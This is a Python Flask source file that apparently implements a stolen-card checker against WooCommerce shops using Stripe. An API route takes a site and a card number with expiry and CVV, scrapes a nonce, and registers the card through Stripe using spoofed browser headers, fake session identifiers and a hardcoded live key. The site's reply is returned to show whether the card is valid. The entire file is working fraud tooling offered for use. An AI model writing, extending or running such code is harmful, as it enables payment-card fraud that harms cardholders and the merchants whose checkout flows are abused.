from flask import Flask, request, jsonify
import aiohttp
import asyncio

app = Flask(__name__)

DOMAIN = None
PK = None

def parseX(data, start, end):
    try:
        star = data.index(start) + len(start)
        last = data.index(end, star)
        return data[star:last]
    except ValueError:
        return "None"

async def make_request(
    session,
    url,
    method="POST",
    params=None,
    headers=None,
    data=None,
    json=None,
):
    async with session.request(
        method,
        url,
        params=params,
        headers=headers,
        data=data,
        json=json,
    ) as response:
        return await response.text()

async def ppc(cards, domain, pk):
    cc, mon, year, cvv = cards.split("|")
    year = year[-2:]

    async with aiohttp.ClientSession() as my_session:
        headers = {
            "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
            "accept-language": "en-US,en;q=0.9",
            "cache-control": "max-age=0",
            "priority": "u=0, i",
            "referer": f"{domain}/my-account/payment-methods/",
            "sec-ch-ua": '"Google Chrome";v="135", "Not-A.Brand";v="8", "Chromium";v="135"',
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": '"Windows"',
            "sec-fetch-dest": "document",
            "sec-fetch-mode": "navigate",
            "sec-fetch-site": "same-origin",
            "sec-fetch-user": "?1",
            "upgrade-insecure-requests": "1",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36",
        }

        req = await make_request(
            my_session,
            url=f"{domain}/my-account/add-payment-method/",
            method="GET",
            headers=headers,
        )
        await asyncio.sleep(1)
        nonce = parseX(req, '"createAndConfirmSetupIntentNonce":"', '"')

        headers2 = {
            "accept": "application/json",
            "accept-language": "en-US,en;q=0.9",
            "content-type": "application/x-www-form-urlencoded",
            "origin": "https://js.stripe.com",
            "priority": "u=1, i",
            "referer": "https://js.stripe.com/",
            "sec-ch-ua": '"Google Chrome";v="135", "Not-A.Brand";v="8", "Chromium";v="135"',
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": '"Windows"',
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-site",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36",
        }

        data2 = {
            "type": "card",
            "card[number]": f"{cc}",
            "card[cvc]": f"{cvv}",
            "card[exp_year]": f"{year}",
            "card[exp_month]": f"{mon}",
            "allow_redisplay": "unspecified",
            "billing_details[address][postal_code]": "99501",
            "billing_details[address][country]": "US",
            "pasted_fields": "number",
            "payment_user_agent": "stripe.js/b85ba7b837; stripe-js-v3/b85ba7b837; payment-element; deferred-intent",
            "referrer": domain,
            "time_on_page": "187650",
            "client_attribution_metadata[client_session_id]": "8c6ceb69-1a1d-4df7-aece-00f48946fa47",
            "client_attribution_metadata[merchant_integration_source]": "elements",
            "client_attribution_metadata[merchant_integration_subtype]": "payment-element",
            "client_attribution_metadata[merchant_integration_version]": "2021",
            "client_attribution_metadata[payment_intent_creation_flow]": "deferred",
            "client_attribution_metadata[payment_method_selection_flow]": "merchant_specified",
            "guid": "19ae2e71-398b-4dff-929f-1578fe0c0a1a4731fd",
            "muid": "2b6bbdfd-253b-4197-b81b-4d9f3035cd009df6c5",
            "sid": "ad7b0952-8857-4cfd-b07f-3f43034df86cea6048",
            "key": pk,
            "_stripe_version": "2024-06-20",
        }

        req2 = await make_request(
            my_session,
            f"https://api.stripe.com/v1/payment_methods",
            headers=headers2,
            data=data2,
        )
        await asyncio.sleep(1)
        pmid = parseX(req2, '"id": "', '"')

        headers3 = {
            "accept": "*/*",
            "accept-language": "en-US,en;q=0.9",
            "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
            "origin": domain,
            "priority": "u=1, i",
            "referer": f"{domain}/my-account/add-payment-method/",
            "sec-ch-ua": '"Google Chrome";v="135", "Not-A.Brand";v="8", "Chromium";v="135"',
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": '"Windows"',
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-origin",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36",
            "x-requested-with": "XMLHttpRequest",
        }
        data3 = {
            "action": "create_and_confirm_setup_intent",
            "wc-stripe-payment-method": pmid,
            "wc-stripe-payment-type": "card",
            "_ajax_nonce": nonce,
        }
        req4 = await make_request(
            my_session,
            url=f"{domain}/?wc-ajax=wc_stripe_create_and_confirm_setup_intent",
            headers=headers3,
            data=data3,
        )
        return req4

@app.route('/gateway=autostripe/key=AloneOp/site=<site>/cc=<cc>')
async def process_card(site, cc):
    try:
        # Set the domain and Stripe public key based on the site parameter
        domain = f"https://{site}"
        pk = "pk_live_51HXJ75BNphwjqAcqNxLniKwT9tTzm87qpBKv6OpGGj40ijQY6fxDNVTVPDtHvyaRkpI1q7DON9p3kukPjh7IjCPf00AGX8DWsR"
        
        result = await ppc(cc, domain, pk)
        return jsonify({
            "status": "success",
            "card": cc,
            "result": result
        })
    except Exception as e:
        return jsonify({
            "status": "error",
            "message": str(e)
        }), 400

if __name__ == '__main__':
    app.run(debug=True)
